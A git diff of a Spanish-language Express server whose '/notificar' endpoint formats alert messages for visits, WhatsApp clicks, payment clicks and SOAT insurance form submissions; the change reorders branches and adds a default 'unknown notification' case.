@@ -31,7 +31,7 @@ app.post('/notificar', async (req, res) => {
 💰 *Valor estimado:* ${datos.valor || '$0'}
 `.trim();
 
-  // 🟡 Clic en Pagar (nuevo)
+  // 🟡 Clic en Pagar
   } else if (datos.tipo === "pago") {
     mensaje = `
 🟡 *Clic en Pagar*
@@ -40,16 +40,8 @@ app.post('/notificar', async (req, res) => {
 💵 *Valor:* ${datos.valor || '$0'}
 `.trim();
 
-  // 🆕 Página nueva: visitante
-  } else if (datos.tipo === "nuevo_visita") {
-    mensaje = "👀 *Nuevo visitante en la página nueva*";
-
-  // 🆕 Página nueva: clic en WhatsApp
-  } else if (datos.tipo === "nuevo_whatsapp") {
-    mensaje = "📲 *Usuario hizo clic en WhatsApp en la página nueva*";
-
   // 📥 Envío de formulario completo
-  } else {
+  } else if (datos.tipo === "solicitud") {
     mensaje = `
 📥 *Nueva solicitud de SOAT*:
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
@@ -72,6 +64,17 @@ app.post('/notificar', async (req, res) => {
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
 `.trim();
+
+  // 🔔 NUEVAS NOTIFICACIONES PARA LA PÁGINA NUEVA
+  } else if (datos.tipo === "nuevo_visita") {
+    mensaje = "👀 *Nuevo visitante en la página nueva*";
+
+  } else if (datos.tipo === "nuevo_whatsapp") {
+    mensaje = "📲 *Usuario hizo clic en WhatsApp en la página nueva*";
+
+  // Cualquier otro caso
+  } else {
+    mensaje = "ℹ️ Notificación desconocida";
   }
 
   try {
@@ -97,6 +100,7 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
 });
+
 
 
 
